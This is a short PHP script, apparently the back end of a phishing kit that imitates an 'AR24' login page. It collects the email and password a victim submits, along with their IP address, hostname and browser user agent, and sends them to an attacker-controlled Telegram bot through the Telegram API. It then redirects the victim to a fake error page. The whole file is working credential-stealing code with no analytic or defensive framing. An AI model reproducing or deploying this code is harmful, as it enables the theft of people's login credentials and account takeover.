<?php 
include "token.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


            $message = "/== AR24 Log Infos ==/"; 
            $message .= 'Serveur' . $_SERVER['REMOTE_ADDR'] . "\r\n";
           
            $message .= 'Email: ' . $_POST['ide'] . "\r\n";

            $message .= 'Mot de passe: ' . $_POST['pwd'] . "\r\n";
           
            $message .= "/--------- user details ---------/" . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";

            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- --/' . "\r\n\r\n";
            file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );

  
            
             header("location: ../log_error.php");
            
 
?>

